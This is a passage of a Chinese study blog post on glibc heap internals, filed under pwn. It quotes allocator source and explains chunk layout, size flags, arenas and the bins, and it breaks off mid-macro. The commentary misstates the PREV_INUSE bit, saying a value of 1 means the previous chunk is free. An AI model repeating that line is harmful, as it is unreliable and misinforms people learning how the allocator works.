<hr>
<p>title: Basic Heap<br>date: 2022-10-20 22:25:00<br>updated: 2022-10-20 22:25:01<br>tags: </p>
<ul>
<li>glibc source code<br>categories: </li>
<li>[pwn, heap]<br>excerpt: 我好菜啊！！！ 呜呜呜😭</li>
</ul>
<hr>
<h1 id="Basic-Heap"><a href="#Basic-Heap" class="headerlink" title="Basic Heap"></a>Basic Heap</h1><h2 id="Basic-Knowledge"><a href="#Basic-Knowledge" class="headerlink" title="Basic Knowledge"></a>Basic Knowledge</h2><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h3><pre><code class="c">/* 
x64 -&gt; 8
x86 -&gt; 4
*/
#define INTERNAL_SIZE_T size_t
#define SIZE_SZ                (sizeof(INTERNAL_SIZE_T))
#define MALLOC_ALIGNMENT       (2 *SIZE_SZ)
#define MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)
/*
  This struct declaration is misleading (but accurate and necessary).
  It declares a &quot;view&quot; into memory allowing access to necessary
  fields at known offsets from a given base. See explanation below.
*/

struct malloc_chunk {
    
    INTERNAL_SIZE_T prev_size;  /* Size of previous chunk (if free).  */
    INTERNAL_SIZE_T size;       /* Size in bytes, including overhead. */

    struct malloc_chunk *fd;         /* double links -- used only if free. */
    struct malloc_chunk *bk;

    /* Only used for large blocks: pointer to next larger size.  */
    struct malloc_chunk *fd_nextsize; /* double links -- used only if free. */
    struct malloc_chunk *bk_nextsize;
};

typedef struct malloc_chunk *mbinptr;
typedef struct malloc_chunk *mchunkptr;
typedef struct malloc_chunk *mfastbinptr;
</code></pre>
<ul>
<li>prev_size ：如果上一个chunk处于释放状态，用于表示其大小</li>
<li>size：表示当前 chunk 的大小</li>
<li>fd, bk：仅在当前chunk被释放时有效，用来表示链表中的上一个chunk及下一个chunk</li>
<li>fd_nextsize，bk_nextsize：仅在当前chunk被释放时有效，用来表示链表中的上一个不同大小的chunk及下一个不同大小的chunk</li>
</ul>
<pre><code class="c">/*
   malloc_chunk details:

    (The following includes lightly edited explanations by Colin Plumb.)

    Chunks of memory are maintained using a `boundary tag&#39; method as
    described in e.g., Knuth or Standish.  (See the paper by Paul
    Wilson ftp://ftp.cs.utexas.edu/pub/garbage/allocsrv.ps for a
    survey of such techniques.)  Sizes of free chunks are stored both
    in the front of each chunk and at the end.  This makes
    consolidating fragmented chunks into bigger chunks very fast.  The
    size fields also hold bits representing whether chunks are free or
    in use.

    An allocated chunk looks like this:


    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of previous chunk, if unallocated (P clear)  |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of chunk, in bytes                     |A|M|P|
      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             User data starts here...                          .
        .                                                               .
        .             (malloc_usable_size() bytes)                      .
        .                                                               |
nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             (size of chunk, but used for application data)    |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of next chunk, in bytes                |A|0|1|
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

    Where &quot;chunk&quot; is the front of the chunk for the purpose of most of
    the malloc code, but &quot;mem&quot; is the pointer that is returned to the
    user.  &quot;Nextchunk&quot; is the beginning of the next contiguous chunk.

    Chunks always begin on even word boundaries, so the mem portion
    (which is returned to the user) is also on an even word boundary, and
    thus at least double-word aligned.

    Free chunks are stored in circular doubly-linked lists, and look like this:

    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of previous chunk, if unallocated (P clear)  |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    `head:&#39; |             Size of chunk, in bytes                     |A|0|P|
      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Forward pointer to next chunk in list             |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Back pointer to previous chunk in list            |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Unused space (may be 0 bytes long)                .
        .                                                               .
        .                                                               |
nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    `foot:&#39; |             Size of chunk, in bytes                           |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of next chunk, in bytes                |A|0|0|
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

    The P (PREV_INUSE) bit, stored in the unused low-order bit of the
    chunk size (which is always a multiple of two words), is an in-use
    bit for the *previous* chunk.  If that bit is *clear*, then the
    word before the current chunk size contains the previous chunk
    size, and can be used to find the front of the previous chunk.
    The very first chunk allocated always has this bit set,
    preventing access to non-existent (or non-owned) memory. If
    prev_inuse is set for any given chunk, then you CANNOT determine
    the size of the previous chunk, and might even get a memory
    addressing fault when trying to do so.

    The A (NON_MAIN_ARENA) bit is cleared for chunks on the initial,
    main arena, described by the main_arena variable.  When additional
    threads are spawned, each thread receives its own arena (up to a
    configurable limit, after which arenas are reused for multiple
    threads), and the chunks in these arenas have the A bit set.  To
    find the arena for a chunk on such a non-main arena, heap_for_ptr
    performs a bit mask operation and indirection through the ar_ptr
    member of the per-heap header heap_info (see arena.c).

    Note that the `foot&#39; of the current chunk is actually represented
    as the prev_size of the NEXT chunk. This makes it easier to
    deal with alignments etc but can be very confusing when trying
    to extend or adapt this code.

    The three exceptions to all this are:

     1. The special chunk `top&#39; doesn&#39;t bother using the
    trailing size field since there is no next contiguous chunk
    that would have to index off it. After initialization, `top&#39;
    is forced to always exist.  If it would become less than
    MINSIZE bytes long, it is replenished.

     2. Chunks allocated via mmap, which have the second-lowest-order
    bit M (IS_MMAPPED) set in their size fields.  Because they are
    allocated one-by-one, each must contain its own trailing size
    field.  If the M bit is set, the other bits are ignored
    (because mmapped chunks are neither in an arena, nor adjacent
    to a freed chunk).  The M bit is also used for chunks which
    originally came from a dumped heap via malloc_set_state in
    hooks.c.

     3. Chunks in fastbins are treated as allocated chunks from the
    point of view of the chunk allocator.  They are consolidated
    with their neighbors only in bulk, in malloc_consolidate.
*/
</code></pre>
<h3 id="size-dependent"><a href="#size-dependent" class="headerlink" title="size dependent"></a>size dependent</h3><pre><code class="c">/* The smallest possible chunk */
// 最小的 chunk 大小
#define MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))
/* The smallest size we can malloc is an aligned minimal chunk */
#define MINSIZE  \
  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))

/*
MIN_CHUNK_SIZE -&gt; 0x20
0000 0000 0000 0000 0000 0000 0010 0000

MALLOC_ALIGN_MASK -&gt; 0xf
0000 0000 0000 0000 0000 0000 0000 1111

~MALLOC_ALIGN_MASK -&gt; -0x10
1111 1111 1111 1111 1111 1111 1111 0000

MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK
0000 0000 0000 0000 0000 0000 0010 1111

(MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK
1111 1111 1111 1111 1111 1111 1111 0000
0000 0000 0000 0000 0000 0000 0010 1111
0000 0000 0000 0000 0000 0000 0010 0000  -&gt; 0x20
*/
// 计算请求的大小
#define request2size(req)                                         \
  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \
   MINSIZE :                                                      \
   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)


malloc(0x1) -&gt; 0x20;
malloc(0x21) -&gt; 0x30
    0x21 + 0x8 + 0xf = 0x38
    0011 1000
    1111 0000
    0011 0000 = 0x30
malloc(0x28) -&gt; 0x30
    0x28 + 0x8 + 0xf = 0x3f
    0011 1111
    1111 0000
    0011 0000 = 0x30
malloc(0x29) -&gt; 0x40
    0x29 + 0x8 + 0xf = 0x40
    0100 0000
    1111 0000
    0100 0000 = 0x40

0x19 ~ 0x28  -&gt;  0x30
0x29 ~ 0x38  -&gt;  0x40
</code></pre>
<pre><code>补码：1111 1111 1111 1111 1111 1111 1111 0000
反码：1111 1111 1111 1111 1111 1111 1110 1111
原码：1000 0000 0000 0000 0000 0000 0001 0000
</code></pre>
<p>在 size 字段中由于 <code>&amp; ~MALLOC_ALIGN_MASK</code>,我们会发现它的后四个比特位一直为0，其中后3个比特位被用作标识，从高到低分别意味着</p>
<ul>
<li>NON_MAIN_ARENA：记录当前 chunk 是否不属于主线程</li>
<li>IS_MMAPPED：用于标识一个chunk是否是从mmap()函数中获得的。如果用户申请一个相当大的内存，malloc会通过 mmap()函数分配一个映射段。</li>
<li>PREV_INUSE：用于标识上一个chunk的状态。当它为1 时，表示上一个chunk处于释放状态，否则表示上一个chunk处于使用状态。</li>
</ul>
<pre><code class="c">/* size field is or&#39;ed with PREV_INUSE when previous adjacent chunk in use */
#define PREV_INUSE 0x1

/* extract inuse bit of previous chunk */
#define prev_inuse(p)       ((p)-&gt;mchunk_size &amp; PREV_INUSE)


/* size field is or&#39;ed with IS_MMAPPED if the chunk was obtained with mmap() */
#define IS_MMAPPED 0x2

/* check for mmap()&#39;ed chunk */
#define chunk_is_mmapped(p) ((p)-&gt;mchunk_size &amp; IS_MMAPPED)


/* size field is or&#39;ed with NON_MAIN_ARENA if the chunk was obtained
   from a non-main arena.  This is only set immediately before handing
   the chunk to the user, if necessary.  */
#define NON_MAIN_ARENA 0x4

/* Check for chunk from main arena.  */
#define chunk_main_arena(p) (((p)-&gt;mchunk_size &amp; NON_MAIN_ARENA) == 0)

/* Mark a chunk as not being on the main arena.  */
#define set_non_main_arena(p) ((p)-&gt;mchunk_size |= NON_MAIN_ARENA)


/*
   Bits to mask off when extracting size

   Note: IS_MMAPPED is intentionally not masked off from size field in
   macros for which mmapped chunks should never be seen. This should
   cause helpful core dumps to occur if it is tried by accident by
   people extending or adapting this malloc.
 */
#define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)

/* Get size, ignoring use bits */
#define chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))

/* Like chunksize, but do not mask SIZE_BITS.  */
#define chunksize_nomask(p)         ((p)-&gt;mchunk_size)

/* Ptr to next physical malloc_chunk. */
#define next_chunk(p) ((mchunkptr) (((char *) (p)) + chunksize (p)))

/* Size of the chunk below P.  Only valid if prev_inuse (P).  */
#define prev_size(p) ((p)-&gt;mchunk_prev_size)

/* Set the size of the chunk below P.  Only valid if prev_inuse (P).  */
#define set_prev_size(p, sz) ((p)-&gt;mchunk_prev_size = (sz))

/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */
#define prev_chunk(p) ((mchunkptr) (((char *) (p)) - prev_size (p)))

/* Treat space at ptr + offset as a chunk */
#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))

/* extract p&#39;s inuse bit */
#define inuse(p)                                  \
  ((((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size) &amp; PREV_INUSE)

/* set/clear chunk as being inuse without otherwise disturbing */
#define set_inuse(p)                                  \
  ((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size |= PREV_INUSE

#define clear_inuse(p)                                  \
  ((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size &amp;= ~(PREV_INUSE)


/* check/set/clear inuse bits in known places */
#define inuse_bit_at_offset(p, s)                          \
  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp; PREV_INUSE)

#define set_inuse_bit_at_offset(p, s)                          \
  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size |= PREV_INUSE)

#define clear_inuse_bit_at_offset(p, s)                          \
  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp;= ~(PREV_INUSE))


/* Set size at head, without disturbing its use bit */
#define set_head_size(p, s)  ((p)-&gt;mchunk_size = (((p)-&gt;mchunk_size &amp; SIZE_BITS) | (s)))

/* Set size/use field */
#define set_head(p, s)       ((p)-&gt;mchunk_size = (s))

/* Set size at footer (only when chunk is not in use) */
#define set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))-&gt;mchunk_prev_size = (s))
</code></pre>
<p><img src="Heap.assets/image-20221018115053387.png" alt="image-20221018115053387"></p>
<pre><code class="c">void* malloc (size_t size);
void free (void* ptr);
</code></pre>
<p><img src="Heap.assets/image-20221018120411190.png" alt="image-20221018120411190"></p>
<pre><code class="c">#define chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))
#define mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))
</code></pre>
<h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><p>每个线程只有一个 arena header， 里面保存了bins ，top chunk等信息。主线程的main_arena保存在libc.so的数据段里，其他线程的arena 则保存在给该arena分配的heap里面。malloc_state定义如下</p>
<pre><code class="c">
/*
   have_fastchunks indicates that there are probably some fastbin chunks.
   It is set true on entering a chunk into any fastbin, and cleared early in
   malloc_consolidate.  The value is approximate since it may be set when there
   are no fastbin chunks, or it may be clear even if there are fastbin chunks
   available.  Given it&#39;s sole purpose is to reduce number of redundant calls to
   malloc_consolidate, it does not affect correctness.  As a result we can safely
   use relaxed atomic accesses.
 */


struct malloc_state {
    /* Serialize access.  */
    __libc_lock_define (, mutex);

    /* Flags (formerly in max_fast).  */
    int flags;

    /* Set if the fastbin chunks contain recently inserted free blocks.  */
    /* Note this is a bool but not all targets support atomics on booleans.  */
    int have_fastchunks;

    /* Fastbins */
    mfastbinptr fastbinsY[NFASTBINS];

    /* Base of the topmost chunk -- not otherwise kept in a bin */
    mchunkptr top;

    /* The remainder from the most recent split of a small request */
    mchunkptr last_remainder;

    /* Normal bins packed as described above */
    mchunkptr bins[NBINS * 2 - 2];

    /* Bitmap of bins */
    unsigned int binmap[BINMAPSIZE];

    /* Linked list */
    struct malloc_state *next;

    /* Linked list for free arenas.  Access to this field is serialized
       by free_list_lock in arena.c.  */
    struct malloc_state *next_free;

    /* Number of threads attached to this arena.  0 if the arena is on
       the free list.  Access to this field is serialized by
       free_list_lock in arena.c.  */
    INTERNAL_SIZE_T attached_threads;

    /* Memory allocated from the system in this arena.  */
    INTERNAL_SIZE_T system_mem;
    INTERNAL_SIZE_T max_system_mem;
};


/* There are several instances of this struct (&quot;arenas&quot;) in this
   malloc.  If you are adapting this malloc in a way that does NOT use
   a static or mmapped malloc_state, you MUST explicitly zero-fill it
   before using. This malloc relies on the property that malloc_state
   is initialized to all zeroes (as is true of C statics).  */

static struct malloc_state main_arena =
        {
                .mutex = _LIBC_LOCK_INITIALIZER,
                .next = &amp;main_arena,
                .attached_threads = 1
        };
</code></pre>
<pre><code class="c">pwndbg&gt; ptype /o struct malloc_state
/* offset      |    size */  type = struct malloc_state {
/*      0      |       4 */    __libc_lock_t mutex;
/*      4      |       4 */    int flags;
/*      8      |       4 */    int have_fastchunks;
/* XXX  4-byte hole      */
/*     16      |      80 */    mfastbinptr fastbinsY[10];
/*     96      |       8 */    mchunkptr top;
/*    104      |       8 */    mchunkptr last_remainder;
/*    112      |    2032 */    mchunkptr bins[254];
/*   2144      |      16 */    unsigned int binmap[4];
/*   2160      |       8 */    struct malloc_state *next;
/*   2168      |       8 */    struct malloc_state *next_free;
/*   2176      |       8 */    size_t attached_threads;
/*   2184      |       8 */    size_t system_mem;
/*   2192      |       8 */    size_t max_system_mem;

                               /* total size (bytes): 2200 */
                             }
</code></pre>
<p><img src="Heap.assets/image-20221018191719463.png" alt="image-20221018191719463"></p>
<ul>
<li><p>mutex：序列化对一个竞技场的访问。Malloc在向 arena 请求堆内存之前锁定了 arena 的 mutex</p>
</li>
<li><p>flags：保存信息，如一个 arena 的堆内存是否连续等</p>
</li>
<li><p>have_fastchunks：被视为一个 bool 值，表示 fastbins 是否为空，当一个块被链接到一个 fastbin 中时被设置，并由 malloc_consolidate() 清除 这个字段和它后面的填充DWORD只存在于GLIBC版本&gt;=2.27。在GLIBC版本&lt;=2.26中，它是flags字段的一部分。</p>
</li>
<li><p>fastbinsY[NFASTBINS]：存放每个 fast chunk 链表头部的指针。尽管在默认情况下只有7个这样的fastbins可用，但 mallopt() 函数可以通过修改 global_max_fast 变量来改变这个数字。</p>
</li>
<li><p>top：top chunk 是最顶部的可用 chunk，即与可用内存的末端接壤的那个，在一个新的 arena 被初始化后，一个 top chunk 总是存在的，而且每个 arena 只有一个。只有当请求无法从同一 arena 的任何其他 bin 中得到服务时，才会从 top chunk 中得到服务。当一个 top chunk 太小，无法满足低于 mmap 阈值的请求时，malloc 会尝试通过 sysmalloc() 函数增加 top chunk 所在的堆，然后扩展 top chunk。如果不成功，就会分配一个新的堆，成为该 arena 的 top chunk，而旧的t op chunk 中的任何剩余内存都会被释放。为了达到这个目的，malloc在堆的末端放置了2个0x10大小的 “栅栏柱 “块，以确保向前合并的尝试不会导致越界读取。</p>
</li>
<li><p>last_remainder：这个字段持有前一个切割操作产生的块的地址。它由属于 smallbin 范围的请求填充，该请求来自 unsorted bin (来自现有的 last_remainder)，或来自binmap搜索。要从一个 unsorted bin 中进行切割，最后的剩余块必须位于 unsorted bin的头部。</p>
<p>分割：例如，在请求一个0x100大小的块时，如果线程的 arena 只有一个0x300大小的块可以提供， malloc将从它的空闲列表中解开0x300块，从中分割出一个0x100块，将所谓的剩余部分（一个 0x200大小的块）链接到未排序bin的头部，然后分配0x100块。</p>
<p>耗尽：如果一个线程请求一个0x80大小的块，而它的 arena 只有一个0x90大小的块可用，malloc会通过分配整个块而不是重新分配来 “耗尽 “这个0x90块。这是因为在从0x90块中取出0x80字节后 ，没有足够的空间留给一个最小尺寸的块。</p>
</li>
<li><p>bins[NBINS * 2 - 2]：用于存储 unstored bin，small bins 和 large bins 的 chunk 链表。</p>
</li>
<li><p>binmap[BINMAPSIZE]：binmap 是个位向量，它可以表示 arena 的 smallbins 和 largebins 哪些被占用。当一个请求无法从其相应的 bin 中得到服务时。它被malloc用来快速找到下一个最大的、且有值的 bin。Binmap搜索发生在不成功的unsortedbin或largebin搜索之后，这取决于请求大小。Malloc找到下一个最大的、被占用的bin，并耗尽/切割 该bin中的最后一个块，在后一种情况下，如果请求是在small bin范围内，剩余部分被写入 last_remainder。</p>
</li>
<li><p>next：arena 的单链循环列表的下一个。</p>
</li>
<li><p>*next_free：一个单链的、非循环的自由 arena 列表（没有连接线程的 arena）。</p>
</li>
<li><p>attached_threads：同时使用这个竞技场的线程数量。</p>
</li>
<li><p>system_mem：目前该 arena 映射的可写内存总量。</p>
</li>
<li><p>max_system_mem：这个 arena 在任何时候所映射的最大的可写内存量。</p>
</li>
</ul>
<h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><pre><code class="c">/*
   Fastbins

    An array of lists holding recently freed small chunks.  Fastbins
    are not doubly linked.  It is faster to single-link them, and
    since chunks are never removed from the middles of these lists,
    double linking is not necessary. Also, unlike regular bins, they
    are not even processed in FIFO order (they use faster LIFO) since
    ordering doesn&#39;t much matter in the transient contexts in which
    fastbins are normally used.

    Chunks in fastbins keep their inuse bit set, so they cannot
    be consolidated with other free chunks. malloc_consolidate
    releases all chunks in fastbins and consolidates them with
    other free chunks.
 */

#define fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])

/* offset 2 to use otherwise unindexable first 2 bins */
#define fastbin_index(sz) \
  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)

/*
    0x30 = 0011 0000 &gt;&gt; 4 -&gt; 0000 0011 -&gt; 3 - 2 = 1
    0xa0 = 1010 0000 &gt;&gt; 4 -&gt; 0000 1010 -&gt; 10 - 2 = 8
*/


/* The maximum fastbin request size we support */
#define MAX_FAST_SIZE     (80 * SIZE_SZ / 4)

#define NFASTBINS  (fastbin_index (request2size (MAX_FAST_SIZE)) + 1)
</code></pre>
<pre><code class="c">#define SMALLBIN_WIDTH    MALLOC_ALIGNMENT
/*
   Set value of max_fast.
   Use impossibly small value if 0.
   Precondition: there are no existing fastbin chunks.
   Setting the value clears fastchunk bit but preserves noncontiguous bit.
 */

#define set_max_fast(s) \
  global_max_fast = (((s) == 0)                              \
                     ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))
#define get_max_fast() global_max_fast

/* Maximum size of memory handled in fastbins.  */
static INTERNAL_SIZE_T global_max_fast;

#define DEFAULT_MXFAST     (64 * SIZE_SZ / 4)

static void malloc_init_state(mstate av) {
    ...
    if (av == &amp;main_arena)
        set_max_fast (DEFAULT_MXFAST);
    ...
}
</code></pre>
<p><img src="Heap.assets/image-20221018141013527.png" alt="image-20221018141013527"></p>
<p>它是一个单链的、非循环链表的集合，每个列表容纳特定大小的 chunk。每个 arena 有 10 个 fastbin，每个负责持有大小为 0x20 到 0xb0 的块。例如，一个 0x20 的 fastbin 只保存 0x20 大小的空闲块，而一个 0x30 的 fastbin 只能容纳大小为 0x30 的空闲块，等等。尽管在默认情况下只有7个 这样的 fastbins 可用，但 <code>mallopt()</code> 函数可以通过修改global_max_fast变量来改变这个数字。</p>
<p>每个fastbin的头部驻留在它的 arena 上，尽管该bin中的后续块之间的链接是内联存储的。当一 个块的用户数据的第一个四字节被链接到一个fastbin中时，它被重新使用为一个前向指针（ fd）。一个空的fd表示一个fastbin中的最后一个块。</p>
<p>Fastbins是后进先出(LIFO)的结构，将一个块释放到一个fastbin中，会将其链接到该fastbin的头部。同样地，请求与非空fastbin相匹配的大小的块，将导致在该fastbin的头部分配该块。</p>
<p>如果对应的tcachebin已经满了，空闲的chunks会直接链接到对应的fastbin。当请求的大小在 fastbin范围内时，在tcache搜索之后，在任何其他bins搜索之前，进行fastbin搜索。</p>
<pre><code class="v">int __libc_mallopt(int param_number, int value) {
    mstate av = &amp;main_arena;
    int res = 1;

    if (__malloc_initialized &lt; 0)
        ptmalloc_init();
    __libc_lock_lock(av-&gt;mutex);

    LIBC_PROBE(memory_mallopt, 2, param_number, value);

    /* We must consolidate main arena before changing max_fast
       (see definition of set_max_fast).  */
    malloc_consolidate(av);

    switch (param_number) {
        case M_MXFAST:
            if (value &gt;= 0 &amp;&amp; value &lt;= MAX_FAST_SIZE) {
                LIBC_PROBE(memory_mallopt_mxfast, 2, value, get_max_fast());
                set_max_fast (value);
            } else
                res = 0;
            break;

        case M_TRIM_THRESHOLD:
            do_set_trim_threshold(value);
            break;

        case M_TOP_PAD:
            do_set_top_pad(value);
            break;

        case M_MMAP_THRESHOLD:
            res = do_set_mmap_threshold(value);
            break;

        case M_MMAP_MAX:
            do_set_mmaps_max(value);
            break;

        case M_CHECK_ACTION:
            do_set_mallopt_check(value);
            break;

        case M_PERTURB:
            do_set_perturb_byte(value);
            break;

        case M_ARENA_TEST:
            if (value &gt; 0)
                do_set_arena_test(value);
            break;

        case M_ARENA_MAX:
            if (value &gt; 0)
                do_set_arena_max(value);
            break;
    }
    __libc_lock_unlock(av-&gt;mutex);
    return res;
}
</code></pre>
<h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><pre><code class="c">/* addressing -- note that bin_at(0) does not exist */
#define bin_at(m, i) \
  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))                  \
             - offsetof (struct malloc_chunk, fd))

/*
   Unsorted chunks

    All remainders from chunk splits, as well as all returned chunks,
    are first placed in the &quot;unsorted&quot; bin. They are then placed
    in regular bins after malloc gives them ONE chance to be used before
    binning. So, basically, the unsorted_chunks list acts as a queue,
    with chunks being placed on it in free (and malloc_consolidate),
    and taken off (to be either used or placed in bins) in malloc.

    The NON_MAIN_ARENA flag is never set for unsorted chunks, so it
    does not have to be taken into account in size comparisons.
 */

/* The otherwise unindexable 1-bin is used to hold unsorted chunks. */
#define unsorted_chunks(M)          (bin_at (M, 1))
</code></pre>
<p><img src="Heap.assets/image-20221018143836059.png" alt="image-20221018143836059"></p>
<p>unsorted bin是一个双链的循环列表，它可以容纳任何大小的空闲块。unsorted bin的头部和尾部位于其 arena 上，而bin中后续块之间的fd和bk链接则存储在堆内。</p>
<p>当对应的tcachebin已满，或超出tcache大小范围（默认情况下为0x420及以上）时，free chunks会直接链接到unsortedbin的头部。在没有tcache的GLIBC编译版本中（GLIBC默认版本 &lt;=2.25），当自由块超出fastbin大小范围（默认情况下为0x90及以上）时，会直接链接到 unsorted bin的头部。</p>
<p>当请求的大小在tcache、fastbins和smallbins 搜索之后，但在largebins搜索之前，unsorted bin 会被搜索到。unsorted bin搜索从bin的尾部开始，然后向头部移动，如果一个块正好符合规范化的请求大小，它就会被分配，搜索就会停止，否则它就会被分类到相应的smallbin或largebin中。</p>
<p>如果在unsorted bin扫描过程中被检查的块不是完全匹配的，但是是最后的剩余，并且大到可以再次剩余，那么它就被剩余。这个剩余操作的结果的块被链接回unsorted bin的头部。</p>
<h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><pre><code class="c">#define NBINS             128
#define NSMALLBINS         64
#define SMALLBIN_WIDTH    MALLOC_ALIGNMENT
#define SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)


#define in_smallbin_range(sz)  \
  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)

#define smallbin_index(sz) \
  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\
   + SMALLBIN_CORRECTION)
</code></pre>
<p><img src="Heap.assets/image-20221018144012079.png" alt="image-20221018144012079"></p>
<p>Smallbins是一个双重链接的循环列表，每个列表都持有特定大小的free chunk。每个arena有62 个smallbins，每个负责保存大小为0x20到0x3f0的自由块，与fastbin的大小重叠。例如，一个 0x20的 small bin只保存大小为0x20的自由块，而一个0x3c0的 small bin只保存大小为0x3c0的自由块等等。</p>
<p>每个 small bin 的头部驻留在它的 arena 中，尽管其中的后续块之间的链接是通过内联存储。当排序发生时，自由块只通过其 arena 的 unsorted bin 链接到其相应的 small bin。当一个块被链接到一 个 samll bin 中时，其用户数据的第一个四字被重新用作前向指针（fd），第二个四字被重新用作后向指针（bk）。</p>
<p>Smallbins是先进先出（FIFO）的结构，将一个块分到一个smallbin中，会将其链接到该smallbin 的头部。同样地，请求与一个非空的 samll bin相匹配的大小的块，将导致从该 small bin 的尾部分配一个块。</p>
<p>Smallbin 搜索在 tcache 搜索之后进行。</p>
<h3 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h3><pre><code class="c">#define MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)

/*
    Larger bins are approximately logarithmically spaced:

    32 bins of size      64
    16 bins of size     512
     8 bins of size    4096
     4 bins of size   32768
     2 bins of size  262144
     1 bin  of size what&#39;s left
*/

#define largebin_index_32(sz)                                                \
  (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 38) ?  56 + (((unsigned long) (sz)) &gt;&gt; 6) :\
   ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;&gt; 9) :\
   ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;&gt; 12) :\
   ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;&gt; 15) :\
   ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;&gt; 18) :\
   126)

#define largebin_index_32_big(sz)                                            \
  (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 45) ?  49 + (((unsigned long) (sz)) &gt;&gt; 6) :\
   ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;&gt; 9) :\
   ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;&gt; 12) :\
   ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;&gt; 15) :\
   ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;&gt; 18) :\
   126)

// XXX It remains to be seen whether it is good to keep the widths of
// XXX the buckets the same or whether it should be scaled by a factor
// XXX of two as well.
#define largebin_index_64(sz)                                                \
  (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 48) ?  48 + (((unsigned long) (sz)) &gt;&gt; 6) :\
